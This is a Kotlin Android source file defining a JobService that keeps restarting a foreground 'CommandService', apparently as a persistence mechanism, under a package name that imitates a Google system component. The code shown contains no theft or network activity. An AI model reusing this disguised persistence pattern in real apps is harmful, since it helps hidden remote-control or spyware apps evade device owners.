package com.google.android.systemservice.services

import android.app.job.JobParameters
import android.app.job.JobService
import android.content.Intent
import android.os.Build
import android.util.Log

class KeepAliveJobService : JobService() {
    companion object {
        private const val TAG = "KeepAliveJob"
    }

    override fun onStartJob(params: JobParameters?): Boolean {
        Log.d(TAG, "KeepAliveJob started")
        ensureServiceRunning()
        // Return false = job completed synchronously (no async work)
        // We don't need jobFinished() when returning false
        return false
    }

    override fun onStopJob(params: JobParameters?): Boolean {
        Log.d(TAG, "KeepAliveJob stopped by system")
        // Return true = reschedule the job if it was interrupted
        return true
    }

    private fun ensureServiceRunning() {
        val intent = Intent(this, CommandService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            Log.d(TAG, "CommandService restart triggered")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to restart CommandService: ${e.message}")
        }
    }
}
